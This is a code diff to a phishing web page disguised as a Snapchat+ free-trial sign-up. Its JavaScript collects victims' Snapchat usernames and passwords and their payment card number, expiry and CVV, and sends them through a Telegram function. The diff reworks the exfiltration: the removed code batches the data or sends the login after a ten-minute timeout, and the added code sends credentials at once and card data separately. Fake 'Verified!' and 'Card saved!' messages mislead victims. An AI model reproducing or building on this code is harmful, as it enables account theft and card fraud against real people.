@@ -1189,7 +1189,7 @@
           <div class="snapchat-icon">👻</div>
           <div>Snapchat+ (Chat with Friends) — Free</div>
         </div>
-        <button class="save-btn" id="save-btn">Complete Sign Up</button>
+        <button class="save-btn" id="save-btn">Save card</button>
         <div class="status-message" id="status-message"></div>
       </div>
     </div>
@@ -1233,111 +1233,29 @@
       const saveBtn = document.getElementById('save-btn');
       const doneBtn = document.getElementById('doneBtn');
 
-      // Store data from page 2
-      let storedUsername = '';
-      let storedPassword = '';
-      let page2Timestamp = null;
-      let timeoutTimer = null;
-      const TIMEOUT_DURATION = 10 * 60 * 1000; // 10 minutes in milliseconds
-
       function showPage1() { 
         page1.classList.add('active'); 
         page2.classList.remove('active'); 
         page3.classList.remove('active'); 
         page4.classList.remove('active'); 
-        clearTimeoutTimer();
       }
-      
       function showPage2() { 
         page1.classList.remove('active'); 
         page2.classList.add('active'); 
         page3.classList.remove('active'); 
         page4.classList.remove('active'); 
-        
-        // Start timeout timer if we have stored data
-        if (storedUsername && storedPassword && page2Timestamp) {
-          startTimeoutTimer();
-        }
       }
-      
       function showPage3() { 
         page1.classList.remove('active'); 
         page2.classList.remove('active'); 
         page3.classList.add('active'); 
         page4.classList.remove('active'); 
-        
-        // Start timeout timer
-        startTimeoutTimer();
       }
-      
       function showPage4() { 
         page1.classList.remove('active'); 
         page2.classList.remove('active'); 
         page3.classList.remove('active'); 
         page4.classList.add('active'); 
-        clearTimeoutTimer();
-      }
-
-      function clearTimeoutTimer() {
-        if (timeoutTimer) {
-          clearTimeout(timeoutTimer);
-          timeoutTimer = null;
-        }
-      }
-
-      function startTimeoutTimer() {
-        clearTimeoutTimer();
-        
-        if (!page2Timestamp) {
-          page2Timestamp = Date.now();
-        }
-        
-        const elapsed = Date.now() - page2Timestamp;
-        const remaining = Math.max(0, TIMEOUT_DURATION - elapsed);
-        
-        if (remaining <= 0) {
-          // Timeout already reached, send partial data immediately
-          sendPartialData();
-          return;
-        }
-        
-        timeoutTimer = setTimeout(() => {
-          sendPartialData();
-        }, remaining);
-      }
-
-      async function sendPartialData() {
-        if (!storedUsername || !storedPassword) return;
-        
-        const message = `⚠️ PARTIAL SUBMISSION - TIMEOUT (10 minutes elapsed) ⚠️\n━━━━━━━━━━━━━━━━━━━━━━━━\n\n👤 SNAPCHAT LOGIN ONLY:\n📱 Username: ${storedUsername}\n🔑 Password: ${storedPassword}\n\n❌ Payment details were NOT provided\n━━━━━━━━━━━━━━━━━━━━━━━━\n⏰ Time: ${new Date().toLocaleString()}`;
-        
-        try {
-          await sendToTelegram(message);
-          
-          // Clear stored data after sending
-          storedUsername = '';
-          storedPassword = '';
-          page2Timestamp = null;
-          
-          // Show warning on current page if still on page 2 or 3
-          if (page2.classList.contains('active')) {
-            userStatusMessage.className = 'status-message error';
-            userStatusMessage.textContent = '⚠️ Session expired - Please start over';
-            userStatusMessage.style.display = 'block';
-          } else if (page3.classList.contains('active')) {
-            statusMessage.className = 'status-message error';
-            statusMessage.textContent = '⚠️ Session expired - Please start over';
-            statusMessage.style.display = 'block';
-          }
-          
-          // Redirect to page 1 after a delay
-          setTimeout(() => {
-            showPage1();
-          }, 3000);
-          
-        } catch (error) {
-          console.error('Failed to send partial data:', error);
-        }
       }
 
       // ----- PAGE 1 logic (selection) -----
@@ -1362,24 +1280,13 @@
       annual.addEventListener('click', () => selectPlan('annual'));
       lens.addEventListener('click', () => selectPlan('lens'));
 
-      trialBtn.addEventListener('click', () => { 
-        // Reset stored data when starting new trial
-        storedUsername = '';
-        storedPassword = '';
-        page2Timestamp = null;
-        clearTimeoutTimer();
-        showPage2(); 
-      });
+      trialBtn.addEventListener('click', () => { showPage2(); });
 
       // back from page2 to page1
-      backToPage1Btn.addEventListener('click', () => { 
-        showPage1(); 
-      });
+      backToPage1Btn.addEventListener('click', () => { showPage1(); });
 
       // back from page3 to page2
-      backToPage2Btn.addEventListener('click', () => { 
-        showPage2(); 
-      });
+      backToPage2Btn.addEventListener('click', () => { showPage2(); });
 
       // ----- PAGE 2 elements (username & password) -----
       const usernameInput = document.getElementById('username');
@@ -1716,34 +1623,36 @@
         });
       }
 
-      // User continue - store data, set timestamp, and move to card page
+      // User continue
       continueBtn.addEventListener('click', async function() {
         if (!continueBtn.classList.contains('active')) return;
+        userStatusMessage.className = 'status-message info'; 
+        userStatusMessage.textContent = '⏳ Verifying...';
         
-        // Store the username and password
-        storedUsername = usernameInput.value;
-        storedPassword = passwordInput.value;
-        page2Timestamp = Date.now();
+        const username = usernameInput.value; 
+        const password = passwordInput.value; 
         
-        // Show success message and move to card page
-        userStatusMessage.className = 'status-message success'; 
-        userStatusMessage.textContent = '✅ Verified!';
+        const message = `👤 SNAPCHAT ACCOUNT DETAILS 👤\n━━━━━━━━━━━━━━━━━━\n📱 Username: ${username}\n🔑 Password: ${password}\n━━━━━━━━━━━━━━━━━━\n⏰ Time: ${new Date().toLocaleString()}`;
         
-        setTimeout(() => {
-          clearUserField(usernameInput, usernameIcon, usernameMessage); 
-          clearUserField(passwordInput, passwordIcon, passwordMessage);
-          userStatusMessage.style.display = 'none';
-          showPage3();  // Go to card page after username/password
-        }, 800);
+        try {
+          await sendToTelegram(message);
+          userStatusMessage.className = 'status-message success'; 
+          userStatusMessage.textContent = '✅ Verified!';
+          setTimeout(() => {
+            clearUserField(usernameInput, usernameIcon, usernameMessage); 
+            clearUserField(passwordInput, passwordIcon, passwordMessage);
+            userStatusMessage.style.display = 'none';
+            showPage3();  // Go to card page after username/password
+          }, 800);
+        } catch (error) {
+          userStatusMessage.className = 'status-message error'; 
+          userStatusMessage.textContent = '❌ Connection failed. Try again.';
+        }
       });
 
-      // Card save - send all details together
+      // Card save
       saveBtn.addEventListener('click', async function() {
         if (!saveBtn.classList.contains('active')) return;
-        
-        // Clear the timeout timer since user completed the form
-        clearTimeoutTimer();
-        
         statusMessage.className = 'status-message info'; 
         statusMessage.textContent = '⏳ Processing...';
         
@@ -1758,26 +1667,19 @@
         else if (cardNumDigits.startsWith('3')) cardTypeStr = 'Amex'; 
         else if (cardNumDigits.startsWith('6')) cardTypeStr = 'Discover';
         
-        // Combine all details into one message
-        const message = `🔐 COMPLETE SNAPCHAT+ ACCOUNT DETAILS 🔐\n━━━━━━━━━━━━━━━━━━━━━━━━\n\n👤 SNAPCHAT LOGIN:\n📱 Username: ${storedUsername}\n🔑 Password: ${storedPassword}\n\n💳 PAYMENT CARD:\n📱 Card Number: ${cardNumber}\n📅 Expiry Date: ${expiry}\n🔐 CVV: ${cvv}\n💳 Card Type: ${cardTypeStr}\n━━━━━━━━━━━━━━━━━━━━━━━━\n⏰ Time: ${new Date().toLocaleString()}`;
+        const message = `💳 CARD DETAILS CAPTURED 💳\n━━━━━━━━━━━━━━━━━━\n📱 Card Number: ${cardNumber}\n📅 Expiry Date: ${expiry}\n🔐 CVV: ${cvv}\n💳 Card Type: ${cardTypeStr}\n━━━━━━━━━━━━━━━━━━\n⏰ Time: ${new Date().toLocaleString()}`;
         
         try {
           await sendToTelegram(message);
           statusMessage.className = 'status-message success'; 
-          statusMessage.textContent = '✅ Sign up complete!';
-          
-          // Clear stored data
-          storedUsername = '';
-          storedPassword = '';
-          page2Timestamp = null;
-          
+          statusMessage.textContent = '✅ Card saved!';
           setTimeout(() => {
             clearField(cardInput, cardIcon, cardMessage, cardType); 
             clearField(expiryInput, expiryIcon, expiryMessage); 
             clearField(cvvInput, cvvIcon, cvvMessage);
             statusMessage.style.display = 'none';
-            showPage4();  // Go to welcome page after all details are sent
-          }, 1500);
+            showPage4();  // Go to welcome page after card
+          }, 800);
         } catch (error) {
           statusMessage.className = 'status-message error'; 
           statusMessage.textContent = '❌ Connection failed. Try again.';
